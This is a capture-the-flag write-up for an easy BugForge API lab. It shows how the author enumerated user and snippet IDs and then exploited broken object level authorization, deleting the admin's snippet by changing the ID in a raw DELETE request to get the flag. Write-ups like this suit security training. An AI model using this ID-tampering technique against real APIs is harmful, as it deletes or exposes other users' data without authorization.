# copypasta (daily challenge)
> **difficulty:** `easy`
> 
> **xp earned:** `10`
>
> **categories:** api pentesting
>
> **vulns:** broken object level authorization

## 0x00: intro
- at first, we can login or register into the application, so, let's create our user
    ![register](image.png)
- all actions on the application are controlled via api endpoints. when we register our user, the api returns a jwt and the role of this user, in this case, just `user`. we can try mass assignment, but will dont work.
    ![meeting the api](image-1.png)
- ok, lets interact with the app and see your features. basically, we can create, edit and delete code snippets, make them public our private, see and comment at other users snipetts. in addition of common features like change username or password and delete our account.
- before we continue, let's enumerate the users (via `/api/snippets/public` response)
    ```json
    [
        {
            "user_id":"2",
            "username":"coder123"
        },
        {
            "user_id":"3",
            "username":"pythonista"
        },
        {
            "user_id":"4",
            "username":"webdev"
        },
        {
            "user_id":"1",
            "username":"admin"
        }
    ]
    ```
- obs: in this endpoint, we can see that each snippet had an id. admin's snippet id is `7`

## 0x01: defining our main target (admin)
- with all this information, the first thing that i thinked to do was try to interact directly with admin stuff, like access private notes, but this isn't possible, because we can only see public snippets, all togheter. to individual snippets, we can only view the comments. we can see user's information by reading `/api/profile/admin`, but there's nothing interesting.

## 0x02: show me the flag!
- ok, after try some stuff and fail, i decided to delete an snippet that i've created. looking at the request, i see something interesting:
    ```
    DELETE /api/snippets/8 HTTP/2
    Host: lab-1768408858372-l4lvaq.labs-app.bugforge.io
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJnaHUiLCJpYXQiOjE3Njg0MDg5OTd9.vnfeokWaRBPNZU3jIYPJ5QsGMxQqsMcY0emBcbQkMhg
    ```
- ok, and if i decided to pass, for example, the id `7`, i will delete the admin snippet?
    ```json
    DELETE /api/snippets/7 HTTP/2
    Host: lab-1768408858372-l4lvaq.labs-app.bugforge.io
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJnaHUiLCJpYXQiOjE3Njg0MDg5OTd9.vnfeokWaRBPNZU3jIYPJ5QsGMxQqsMcY0emBcbQkMhg

    HTTP/2 200 OK
    Access-Control-Allow-Origin: *
    Content-Type: application/json; charset=utf-8
    Date: Wed, 14 Jan 2026 17:01:20 GMT
    Etag: W/"59-Ov4i5DTuJ+cAK1dfP4qM8uULCK0"
    X-Powered-By: Express
    Content-Length: 89

    {
        "message":"Snippet deleted successfully",
        "flag":"bug{xxxxxTk5sycy9Xca}"
    }
    ```
- gotcha! ;)